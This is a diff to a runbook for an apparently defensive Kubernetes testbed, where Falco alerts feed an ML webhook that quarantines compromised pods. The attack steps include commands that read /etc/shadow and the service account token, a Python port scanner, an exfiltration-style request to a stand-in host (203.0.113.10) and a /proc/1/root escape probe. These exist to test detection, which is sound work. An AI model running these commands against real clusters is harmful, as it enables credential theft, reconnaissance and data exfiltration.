@@ -209,7 +209,7 @@ kubectl get pods -n aiops-security -l app.kubernetes.io/name=falco -w
 kubectl apply -f infrastructure/k8s/falco/
 
 # Wait for Falco DaemonSet pod to become ready
-kubectl get pods -n aiops-security -l app=falco -w
+kubectl get pods -n aiops-security -l app.kubernetes.io/name=falco -w
 ```
 
 ---
@@ -236,17 +236,29 @@ python response_engine/webhook_server.py --port 5000 --host 0.0.0.0 --model-dir 
 ---
 
 ### Terminal 2: Stream Live Falco Telemetry into Aggregator & API
+
+> [!WARNING]
+> Terminal 2 (log aggregator) **MUST be started BEFORE** you launch any attacks in Terminal 4. The `--tail=0` flag means Falco only streams new events from the moment the log stream starts. If the aggregator isn't running when you execute attacks, those Falco alerts are lost.
+
 ```bash
 source .venv/bin/activate
 
 # For Helm installation:
 kubectl logs -l app.kubernetes.io/name=falco -n aiops-security --follow --tail=0 | \
-  python infrastructure/telemetry/log_aggregator.py --stdin --forward-url http://localhost:5000/api/v1/event --output unified_telemetry.jsonl
+  python infrastructure/telemetry/log_aggregator.py --stdin \
+    --forward-url http://localhost:5000/api/v1/event \
+    --output unified_telemetry.jsonl \
+    --raw-output-dir datasets/falco/raw
 
 # (If using Option B direct manifests, replace the selector with -l app=falco):
 # kubectl logs -l app=falco -n aiops-security --follow --tail=0 | \
-#   python infrastructure/telemetry/log_aggregator.py --stdin --forward-url http://localhost:5000/api/v1/event --output unified_telemetry.jsonl
+#   python infrastructure/telemetry/log_aggregator.py --stdin \
+#     --forward-url http://localhost:5000/api/v1/event \
+#     --output unified_telemetry.jsonl \
+#     --raw-output-dir datasets/falco/raw
 ```
+
+*What the `--raw-output-dir` flag does:* Every raw Falco event is also saved into `datasets/falco/raw/<scenario>/` (e.g., `shell_execution/`, `credential_access/`, `network_scanning/`) for dataset building and future model retraining.
 
 ---
 
@@ -261,27 +273,40 @@ Open **`http://localhost:3333`** in your browser. You will see the live SOC Dash
 
 ## 7. Step 6: Trigger Real Attacks & Observe Automated Quarantine
 
-Open **Terminal 4** to execute runtime attacks against the testbed container:
+> [!IMPORTANT]
+> Ensure **Terminal 1** (webhook server) and **Terminal 2** (log aggregator) are both running before proceeding. The log aggregator must be actively streaming Falco logs.
 
-### Get Target Pod Name
+Open **Terminal 4** to execute runtime attacks against the testbed container.
+
+### Option A: Run the Automated Attack Script (Recommended)
 ```bash
-# Select the vulnerable api-backend pod
+chmod +x scripts/run_attacks.sh
+bash scripts/run_attacks.sh
+```
+This runs all 5 attack scenarios automatically with proper delays between them.
+
+### Option B: Run Attacks Manually
+
+#### Get Target Pod Name
+```bash
+# Select the vulnerable api-backend pod (uses python:3.11-slim, has Python available)
 TARGET_POD=$(kubectl get pods -n aiops-security -l component=api-backend -o jsonpath="{.items[0].metadata.name}")
 echo "Target Vulnerable Pod: $TARGET_POD"
 ```
 
 ---
 
-### 🚨 Attack Scenario 1: Unauthorized Interactive Shell (`kubectl exec`)
+### 🚨 Attack Scenario 1: Unauthorized Shell Access (`kubectl exec`)
 MITRE ATT&CK: **T1609 (Container Administration Command)**
 
 ```bash
-kubectl exec -it $TARGET_POD -n aiops-security -- /bin/bash
+# Spawn a shell inside the container (triggers Falco's "Shell Spawned in Container" rule)
+kubectl exec $TARGET_POD -n aiops-security -- /bin/sh -c "echo 'Shell access gained'"
 ```
 *What happens:*
-1. Falco immediately flags the unexpected terminal spawn syscall (`execve`).
+1. Falco immediately flags the unexpected shell spawn (`execve` syscall).
 2. Log aggregator normalizes the alert and forwards it to `/api/v1/event`.
-3. Autoencoder flags high reconstruction error ($MSE > \text{threshold}$).
+3. ML pipeline scores the event and flags it as HIGH/CRITICAL risk.
 4. Anomaly is mapped to `T1609`.
 5. Webhook Server creates `aiops-isolate-<pod-name>` NetworkPolicy.
 6. The container network is instantly cut!
@@ -289,12 +314,17 @@ kubectl exec -it $TARGET_POD -n aiops-security -- /bin/bash
 ---
 
 ### 🚨 Attack Scenario 2: Sensitive Credential Access
-Inside the container shell (or via exec):
 MITRE ATT&CK: **T1552.001 (Credentials in Files)**
 
 ```bash
-kubectl exec -it $TARGET_POD -n aiops-security -- cat /etc/shadow
-kubectl exec -it $TARGET_POD -n aiops-security -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+# Read /etc/passwd (exists in all Linux containers)
+kubectl exec $TARGET_POD -n aiops-security -- cat /etc/passwd
+
+# Read the Kubernetes service account token (exists in all K8s pods)
+kubectl exec $TARGET_POD -n aiops-security -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Attempt /etc/shadow (may not exist in slim images, but the open_read syscall is still flagged)
+kubectl exec $TARGET_POD -n aiops-security -- cat /etc/shadow 2>/dev/null || echo "(Expected: file may not exist in slim image)"
 ```
 
 ---
@@ -303,9 +333,24 @@ kubectl exec -it $TARGET_POD -n aiops-security -- cat /var/run/secrets/kubernete
 MITRE ATT&CK: **T1046 (Network Service Discovery)**
 
 ```bash
-kubectl exec -it $TARGET_POD -n aiops-security -- apt-get update
-kubectl exec -it $TARGET_POD -n aiops-security -- apt-get install -y nmap
-kubectl exec -it $TARGET_POD -n aiops-security -- nmap -sP 10.244.0.0/24
+# Use Python's built-in socket library for network scanning (works on python:3.11-slim)
+# No need to install nmap — this triggers Falco's "Unexpected Outbound Connection" rule
+kubectl exec $TARGET_POD -n aiops-security -- python3 -c "
+import socket
+targets = ['10.244.0.1', '10.96.0.1', '10.96.0.10']
+ports = [80, 443, 8080, 6379, 53]
+for ip in targets:
+    for port in ports:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            s.connect((ip, port))
+            print(f'OPEN: {ip}:{port}')
+            s.close()
+        except:
+            pass
+print('Network scan complete')
+"
 ```
 
 ---
@@ -314,7 +359,25 @@ kubectl exec -it $TARGET_POD -n aiops-security -- nmap -sP 10.244.0.0/24
 MITRE ATT&CK: **T1041 (Exfiltration Over C2 Channel)**
 
 ```bash
-kubectl exec -it $TARGET_POD -n aiops-security -- curl -m 3 http://203.0.113.10:9999/exfil_data
+# Use Python's urllib instead of curl (curl is not installed in python:3.11-slim)
+kubectl exec $TARGET_POD -n aiops-security -- python3 -c "
+import urllib.request
+try:
+    req = urllib.request.Request('http://203.0.113.10:9999/exfil_data')
+    urllib.request.urlopen(req, timeout=2)
+except Exception as e:
+    print(f'Connection attempt (expected to fail): {e}')
+"
+```
+
+---
+
+### 🚨 Attack Scenario 5: Container Escape Probe
+MITRE ATT&CK: **T1611 (Escape to Host)**
+
+```bash
+# Probe the host process namespace via /proc/1/root (triggers Falco's "Container Escape via Procfs" rule)
+kubectl exec $TARGET_POD -n aiops-security -- /bin/sh -c "ls /proc/1/root/ 2>/dev/null || echo 'Access denied (expected)'"
 ```
 
 ---
@@ -340,9 +403,15 @@ kubectl describe networkpolicy -n aiops-security
 *Shows: `Deny Ingress` and `Deny Egress` — pod is quarantined!*
 
 ### 3. Verify Packet Blocking (Network Air-Gap)
-Try to ping or curl from the compromised pod:
+Try to connect from the compromised pod:
 ```bash
-kubectl exec -it $TARGET_POD -n aiops-security -- curl -m 3 https://google.com
+kubectl exec $TARGET_POD -n aiops-security -- python3 -c "
+import urllib.request
+try:
+    urllib.request.urlopen('https://google.com', timeout=3)
+except Exception as e:
+    print(f'Blocked: {e}')
+"
 ```
 *Result:* **Connection timed out / Drop (Blocked by Calico CNI NetworkPolicy)**.
 
